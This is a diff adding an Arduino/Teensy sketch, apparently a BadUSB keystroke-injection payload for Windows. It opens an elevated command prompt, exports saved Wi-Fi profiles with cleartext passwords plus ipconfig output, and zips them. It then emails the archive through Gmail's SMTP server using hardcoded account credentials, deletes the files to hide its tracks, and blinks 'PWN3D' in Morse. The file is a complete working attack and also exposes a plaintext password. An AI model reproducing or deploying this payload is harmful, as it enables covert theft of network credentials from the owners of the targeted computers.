@@ -1,0 +1,229 @@
+#include <paensy.h>
+
+void setup() {
+  
+  // Configure the delay that everything else scales off of.
+  SetDelay(200);
+  // Configure the delay that the Morse code uses.
+  SetMorseDelay(250);
+  
+  // Perform an initial delay to give the USB time to prepare.
+  PerformInitDelay();
+  
+  // LED pin number, 13 for 3.1
+  // 11 for 2 and 2.x
+  SetLEDPin(13);
+  // Put the pin into output mode
+  pinMode(LED_PIN, OUTPUT);
+  // Turn on the LED pin so we know the device is running.
+  digitalWrite(LED_PIN, HIGH);
+  Keyboard.set_modifier(MODIFIERKEY_GUI);
+  Keyboard.set_key1(KEY_D);
+  Keyboard.send_now();
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  delay(500);
+
+  //open cmd
+   Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI); //Windows key
+   Keyboard.set_key1(KEY_R);
+   Keyboard.send_now(); // Send keys to the system
+   Keyboard.set_modifier(0); // Release the GUI (Windows) key
+   delay(500);
+   Keyboard.set_key1(0); // No key
+   Keyboard.send_now(); // Send the key change
+   delay(500);
+   Keyboard.print("cmd");
+   Keyboard.press(KEY_LEFT_CTRL);
+   Keyboard.press(KEY_LEFT_SHIFT);
+   Keyboard.press(KEY_ENTER);
+   Keyboard.releaseAll();
+   delay(500);
+   Keyboard.press(KEY_LEFT_ARROW);
+   Keyboard.releaseAll();
+   Keyboard.press(KEY_ENTER);
+   Keyboard.releaseAll();
+   Keyboard.set_key1(0); 
+   Keyboard.send_now();
+   delay(500);
+
+
+//create log folder
+  delay(300);
+  Keyboard.print("md output");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+//export Wi-Fi info
+  delay(300);
+  Keyboard.print("ipconfig /all>>output.txt");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+//
+  delay(300);
+  Keyboard.print("netsh wlan export profile folder=output key=clear");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+//move log.txt to log
+  delay(300);
+  Keyboard.print("move output.txt output");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+//zip Log folder
+  delay(300);
+  Keyboard.print("tar.exe -a -c -f output.zip output");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+
+//start powershell  
+  delay(500);
+  Keyboard.print("start powershell");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+//email output.zip folder
+    delay(500);
+  Keyboard.print("$Message = new-object Net.Mail.MailMessage");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+    delay(500);
+  Keyboard.print("$smtp = new-object Net.Mail.SmtpClient('smtp.gmail.com', 587)");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+    delay(500);
+  Keyboard.print("$smtp.Credentials = New-Object System.Net.NetworkCredential('bjwalker97@gmail.com', 'SupplyCO.123');");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+     delay(500);
+  Keyboard.print("$smtp.EnableSsl = $true");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+     delay(500);
+  Keyboard.print("$smtp.EnableSsl = $true");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+    delay(500);
+  Keyboard.print("$smtp.Timeout = 400000");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+     delay(500);
+  Keyboard.print("$Message.From = 'bjwalker97@gmail.com'");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+     delay(500);
+  Keyboard.print("$Message.To.Add('bjwalker97@gmail.com')");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+   delay(500);
+  Keyboard.print("$Message.Attachments.Add('output.zip')");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+    delay(500);
+  Keyboard.print("$smtp.Send($Message)");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+ //cleanup
+    delay(500);
+  Keyboard.print("exit");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+    delay(900);
+  Keyboard.print("del output");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+    delay(500);
+  Keyboard.print("y");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+    delay(500);
+  Keyboard.print("rmdir output");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+    delay(500);
+  Keyboard.print("del output.zip");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+    delay(500);
+  Keyboard.print("exit");
+  Keyboard.set_key1(KEY_ENTER);   
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+}
+
+
+void loop() {
+ // Celebratory LED fluttering.
+ LED_Flutter(200, 10);
+ 
+ // P
+ LED_MorseDot();
+ LED_MorseDash();
+ LED_MorseDash();
+ LED_MorseDot();
+ 
+ // W
+ LED_MorseDot();
+ LED_MorseDash();
+ LED_MorseDash();
+ 
+ // N
+ LED_MorseDash();
+ LED_MorseDot();
+
+ // 3
+ LED_MorseDot();
+ LED_MorseDot();
+ LED_MorseDot();
+ LED_MorseDash();
+ LED_MorseDash();
+ 
+ // D
+ LED_MorseDash();
+ LED_MorseDot();
+ LED_MorseDot();
+ 
+ // Flutter again.
+ LED_Flutter(200, 10); 
+}
